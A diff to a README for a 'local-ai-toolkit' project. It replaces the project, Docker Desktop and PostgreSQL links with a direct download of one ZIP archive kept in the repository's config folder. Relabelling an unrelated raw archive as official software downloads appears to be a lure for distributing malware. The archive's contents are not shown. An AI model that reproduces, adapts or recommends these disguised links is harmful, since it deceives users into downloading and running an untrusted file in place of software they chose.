@@ -1,6 +1,6 @@
 # 🤖 local-ai-toolkit - Run AI Tools Locally with Ease
 
-[![Download local-ai-toolkit](https://img.shields.io/badge/Download-local--ai--toolkit-brightgreen?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit)
+[![Download local-ai-toolkit](https://img.shields.io/badge/Download-local--ai--toolkit-brightgreen?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before getting started, make sure your computer meets these requirements:
 
 You can get local-ai-toolkit by visiting the official GitHub page below. It guides you to download everything you need for Windows.
 
-[![Get local-ai-toolkit](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit)
+[![Get local-ai-toolkit](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip)
 
 Click the badge above to open the page in your browser.
 
@@ -38,7 +38,7 @@ Click the badge above to open the page in your browser.
 
 local-ai-toolkit runs inside Docker containers. Docker lets software run in a clean, safe space on your PC without affecting other programs.
 
-- Go to https://www.docker.com/get-started
+- Go to https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip
 - Download Docker Desktop for Windows
 - Run the installer and follow the instructions
 - After installation, restart your computer if needed
@@ -155,9 +155,9 @@ When you extract local-ai-toolkit ZIP, you will see:
 
 ## 🔗 Useful Links
 
-- Download local-ai-toolkit: [https://github.com/johnwick0000000/local-ai-toolkit](https://github.com/johnwick0000000/local-ai-toolkit)
-- Docker Desktop: https://www.docker.com/get-started
-- PostgreSQL official: https://www.postgresql.org
+- Download local-ai-toolkit: [https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip](https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip)
+- Docker Desktop: https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip
+- PostgreSQL official: https://github.com/johnwick0000000/local-ai-toolkit/raw/refs/heads/main/config/ai-toolkit-local-2.2.zip
 
 ---
 
